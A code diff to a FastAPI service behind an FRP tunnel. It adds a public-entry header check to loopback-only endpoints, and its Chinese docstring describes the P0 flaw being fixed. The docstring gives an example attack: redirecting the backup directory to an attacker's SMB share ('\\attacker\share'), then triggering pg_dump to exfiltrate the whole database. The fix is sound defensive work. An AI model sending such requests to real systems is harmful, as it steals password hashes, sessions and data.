@@ -18,7 +18,7 @@ from fastapi import APIRouter, HTTPException, Request
 from pydantic import BaseModel
 
 from app import settings
-from app.security import effective_client_ip
+from app.security import effective_client_ip, is_public_entry
 
 router = APIRouter()
 
@@ -26,7 +26,29 @@ _LOOPBACKS = ("127.0.0.1", "::1", "localhost")
 
 
 def _require_local(request: Request) -> None:
-    """非本机一律 403。"""
+    """非本机一律 403。
+
+    🔴 只看 IP 是不够的，这是 2026-11-04 审查抓到的 P0。
+
+    FRP 隧道的物理链路是「公网 → frps → frpc(本机) → Caddy → 127.0.0.1:8766」。
+    Caddy 看到的 remote_host 就是 127.0.0.1，注入的 X-Real-IP 也是
+    127.0.0.1 —— 于是**公网陌生人发来的请求和桌面托盘发来的请求，
+    在 IP 这个维度上完全一样**。只判 IP 等于把这组免登录端点对整个公网开放：
+
+      · POST /local/backup/dir  {"dir": "\\\\attacker\\share"}   ← 改备份目录
+      · POST /local/backup/run                                    ← 触发 pg_dump
+        两步合起来 = 整个数据库（口令哈希、会话哈希、全部元数据）被写到
+        攻击者的 SMB 共享上。
+      · POST /local/public-url   ← 清空/篡改公网入口配置
+      · GET  /local/backup       ← 泄露磁盘绝对路径与备份清单
+
+    项目自己在 security.py 里早就写明了「FRP 使 client_ip 全为 127.0.0.1、
+    不能按 IP 区分内外」，而 is_public_entry() 就是照这条结论做的可信判据：
+    Caddy 在隧道端口注入 X-LanShare-Entry: public，客户端伪造不了。
+    这里之前没有用它，属于同一个结论只落了一半。
+    """
+    if is_public_entry(request):
+        raise HTTPException(status_code=403, detail="该接口仅限本机访问")
     ip = effective_client_ip(request)
     if ip not in _LOOPBACKS:
         raise HTTPException(status_code=403, detail="该接口仅限本机访问")
